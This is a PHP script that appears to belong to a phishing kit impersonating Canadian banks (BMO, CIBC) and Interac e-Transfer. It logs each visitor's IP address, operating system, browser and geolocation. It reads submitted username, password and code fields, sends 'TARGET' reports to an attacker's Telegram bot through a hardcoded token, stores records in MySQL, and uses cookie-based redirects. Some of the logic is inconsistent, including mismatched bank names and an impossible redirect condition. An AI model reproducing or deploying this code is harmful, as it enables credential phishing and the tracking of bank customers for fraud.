<?php

include "id.php";

$hostname = 'localhost';
$username = 'admin';
$password = 'admin';
$database = 'Visit';

// Create a connection to the MySQL database
$mysqli = new mysqli($hostname, $username, $password, $database);

// Check the connection
if ($mysqli->connect_error) {
    die("Connection failed: " . $mysqli->connect_error);
}

$full_date = date("h:i:s|M/d/Y");
$time = date("h:i:s");
$date = date("M/d/Y");

function get_client_ip()
{
    $ipaddress = '';
    if (isset($_SERVER['HTTP_CLIENT_IP'])) {
        $ipaddress = $_SERVER['HTTP_CLIENT_IP'];
    } else if (isset($_SERVER['HTTP_X_FORWARDED_FOR'])) {
        $ipaddress = $_SERVER['HTTP_X_FORWARDED_FOR'];
    } else if (isset($_SERVER['HTTP_X_FORWARDED'])) {
        $ipaddress = $_SERVER['HTTP_X_FORWARDED'];
    } else if (isset($_SERVER['HTTP_FORWARDED_FOR'])) {
        $ipaddress = $_SERVER['HTTP_FORWARDED_FOR'];
    } else if (isset($_SERVER['HTTP_FORWARDED'])) {
        $ipaddress = $_SERVER['HTTP_FORWARDED'];
    } else if (isset($_SERVER['REMOTE_ADDR'])) {
        $ipaddress = $_SERVER['REMOTE_ADDR'];
    } else {
        $ipaddress = 'UNKNOWN';
    }

    return $ipaddress;
}

$user_agent = $_SERVER['HTTP_USER_AGENT'];

function getOS() { 
    global $user_agent;
    $os_platform  = "Unknown OS Platform";
    $os_array     = array(
        '/windows nt 10/i'      =>  'Windows 10',
        '/windows nt 6.3/i'     =>  'Windows 8.1',
        '/windows nt 6.2/i'     =>  'Windows 8',
        '/windows nt 6.1/i'     =>  'Windows 7',
        '/windows nt 6.0/i'     =>  'Windows Vista',
        '/windows nt 5.2/i'     =>  'Windows Server 2003/XP x64',
        '/windows nt 5.1/i'     =>  'Windows XP',
        '/windows xp/i'         =>  'Windows XP',
        '/windows nt 5.0/i'     =>  'Windows 2000',
        '/windows me/i'         =>  'Windows ME',
        '/win98/i'              =>  'Windows 98',
        '/win95/i'              =>  'Windows 95',
        '/win16/i'              =>  'Windows 3.11',
        '/macintosh|mac os x/i' =>  'Mac OS X',
        '/mac_powerpc/i'        =>  'Mac OS 9',
        '/linux/i'              =>  'Linux',
        '/ubuntu/i'             =>  'Ubuntu',
        '/iphone/i'             =>  'iPhone',
        '/ipod/i'               =>  'iPod',
        '/ipad/i'               =>  'iPad',
        '/android/i'            =>  'Android',
        '/blackberry/i'         =>  'BlackBerry',
        '/webos/i'              =>  'Mobile'
    );

    foreach ($os_array as $regex => $value)
        if (preg_match($regex, $user_agent))
            $os_platform = $value;

    return $os_platform;
}

function getBrowser() {
    global $user_agent;
    $browser        = "Unknown Browser";
    $browser_array = array(
        '/msie/i'      => 'Internet Explorer',
        '/firefox/i'   => 'Firefox',
        '/safari/i'    => 'Safari',
        '/chrome/i'    => 'Chrome',
        '/edge/i'      => 'Edge',
        '/opera/i'     => 'Opera',
        '/netscape/i'  => 'Netscape',
        '/maxthon/i'   => 'Maxthon',
        '/konqueror/i' => 'Konqueror',
        '/mobile/i'    => 'Device not found'
    );

    foreach ($browser_array as $regex => $value)
        if (preg_match($regex, $user_agent))
            $browser = $value;

    return $browser;
}

$user_os        = getOS();
$user_browser   = getBrowser();
$PublicIP = get_client_ip();
$localHost = "127.0.0.1";

if (strpos($PublicIP, ',') !== false) {
    $PublicIP = explode(",", $PublicIP)[0];
}


$ip         = "".$PublicIP;
$uos        = "".$user_os;
$bsr        = "".$user_browser;
$ust= explode(" ", $user_agent);
$vr= $ust[3];
$ver=str_replace(")", "", $vr);
$version   = "Version              : ".$ver;
if (strpos($PublicIP, $localHost) !== false) {
    $details = '{
        "success": false
    }';
}
else {
    $details  = file_get_contents("http://ipwhois.app/json/$PublicIP");
}
$details  = json_decode($details, true);
$success  = $details['success'];
$file = '../../../log.txtt';
$fp = fopen($file, 'a');

if ($success==false) {
    fwrite($fp, $ip."\n");
    fwrite($fp, $uos."\n");
    fwrite($fp, $version."\n");
    fwrite($fp, $bsr."\n");
    fclose($fp);
} else if ($success==true) {
    $country    = $details['country'];
    $city       = $details['city'];
    $continent  = $details['continent'];
    $tp         = $details['type'];
    $cn         = $details['country_phone'];
    $is         = $details['isp'];
    $la         = $details['latitude'];
    $lp         = $details['longitude'];
    $crn        = $details['currency'];
    $type       = $tp;
    $bank       = "BMO";
    $at         = "@";
    $code       = "" . $_GET['code'];
    $username   = "" . $_GET['email'];
    $password   = "" . $_GET['password'];
    $lh         = "|";

    $url        = "https://BMO.com";
    $user       = $_POST['username'];
    $pass       = $_POST['password'];
    $cod        = $_POST['code'];
    $isp        = $is;
    $currency   = "".$full_date;
    $li         = ",";

    // Insert data into a table
    $tableName = 'interac_records';

$messageTelegram = "🌐===CIBC BANK ===🌐\n"; 
$messageTelegram .= "🖥️TARGET|$ip\n";
$messageTelegram .= "🖥️$uos|$browser\n";
$messageTelegram .= "🖥️$is\n";
$messageTelegram .= "🌆$city\n";
$messageTelegram .= "🌐==-CIBC BANK ===🌐\n"; 



    // Send the message using the Telegram bot API
    $apiToken = "6547328306:AAFosAwa7wPggddiOV_QgTw7xI-uX8ZEY6s";
    $chatId = "-1001819831566";
    $data = [
        'chat_id' => $chatId,
        'text' => $messageTelegram,
        'parse_mode' => 'Markdown',
    ];
    $telegramUrl = "https://api.telegram.org/bot$apiToken/sendMessage?" . http_build_query($data);
    $response = file_get_contents($telegramUrl);

    if ($response === false) {
        echo "Server Communication failed";
    }

    // Insert data into your MySQL table for form data here
    $tableName = 'interac_records';

    $stmt = $mysqli->prepare("INSERT INTO $tableName (ip, os, version, browser, message_telegram) VALUES (?, ?, ?, ?, ?)");
    $stmt->bind_param("sssss", $ip, $uos, $version, $bsr, $messageTelegram);

    if ($stmt->execute()) {
        // Data inserted successfully into MySQL
    } else {
        echo "Error: " . $stmt->error;
    }

    $stmt->close();
} else {
    $status     = "Status : ".$success;
    fwrite($fp, $status."\n");
    fwrite($fp, $user_agent."\n");
    fclose($fp);
}
?>
<?php

// Set a cookie to track the number of visits
if (!isset($_COOKIE['visit_count'])) {
    $visit_count = 1;
    setcookie('visit_count', $visit_count, time() + 3600*24*365);
} else {
    $visit_count = $_COOKIE['visit_count'] + 1;
    setcookie('visit_count', $visit_count, time() + 3600*24*365);
}

// Redirect based on visit count
if ($visit_count < 2) {
  header("Location: index.php");
} elseif ($visit_count >= 2 && $visit_count < 19) {
  header("Location: index.php");
} elseif ($visit_count >= 20 && $visit_count < 10) {
  header("Location: https://etransfer.interac.ca/RP.do?pID=CANj43Vy&lvt=7C115B1C874243FC736311916BF3E204AC32B2BC9DF9613E45C5CA70E2950D8F");
} else {
    header('Location: index.php');
}

exit;
